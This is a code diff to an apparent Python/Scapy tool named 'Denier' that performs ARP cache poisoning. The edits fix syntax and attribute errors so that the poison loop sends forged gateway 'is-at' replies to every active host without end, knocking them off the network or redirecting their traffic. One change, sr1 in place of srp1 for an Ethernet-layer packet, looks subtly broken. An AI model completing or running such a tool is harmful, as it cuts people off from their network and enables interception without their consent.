@@ -40,15 +40,15 @@ class IPAddress:
         self.active = None
 
     def resolve_mac(self, bcast_if_fail=True):
-        resp = srp1(
+        resp = sr1(
             Ether()/ARP(pdst=self.ip),
-            timeout=arp_timeout
+            timeout=self.arp_timeout
         )
         if resp is None:
             if bcast_if_fail:
                 self.mac = 'ff:ff:ff:ff:ff:ff'
             else:
-                raise AddressResolutionFailed(
+                raise self.AddressResolutionFailedError(
                     "failed to resolve {}".format(self.ip)
                 )
         else:
@@ -79,9 +79,10 @@ class IPAddress:
         self.active = reply is not None
 
     # TODO
-    def check_poison(self):
+    def check_poison(self, gateway, spoof_mac):
         # TODO: assert promisc mode
         raise NotImplementedError
+
 
 class IPMultiple:
     def __init__(self, addrs):
@@ -167,9 +168,9 @@ class Denier:
                         "{'single', 'multiple', 'network'}"
                     )
             except ValueError as err:
-                raise TargetInactiveException(err) from err
+                raise self.TargetInactiveException(err) from err
             else:
-                raise TargetInactiveException(err)
+                raise self.TargetInactiveException(err)
 
     def restore(self):
         def restore_runner(self, addr):
@@ -181,9 +182,9 @@ class Denier:
                 (Ether(src=self.gateway.mac, dst=addr.mac)
                  / ARP(op='is-at',
                        hwsrc=self.gateway.mac, hwdst=addr.mac,
-                       psrc=self.gateway.ip, pdst=addr.ip))
-                count=restore_count,
-                inter=interval
+                       psrc=self.gateway.ip, pdst=addr.ip)),
+                count=self.restore_count,
+                inter=self.interval
             )
 
         thread_runner(
@@ -196,15 +197,15 @@ class Denier:
             if addr.mac is None:
                 addr.resolve_mac()
             sendp(
-                (Ether(src=spoof_mac, dst=addr.mac)
-                 / ARP(op='is-at'
-                       hwsrc=spoof_mac, hwdst=addr.mac,
-                       psrc=self.gateway.ip, pdst=addr.ip))
-                inter=interval,
+                (Ether(src=self.spoof_mac, dst=addr.mac)
+                 / ARP(op='is-at',
+                       hwsrc=self.spoof_mac, hwdst=addr.mac,
+                       psrc=self.gateway.ip, pdst=addr.ip)),
+                inter=self.interval,
                 loop=True
             )
 
         thread_runner(
             func=self.poison_runner,
-            iterable=
+            iterable=self.active_addrs
         )
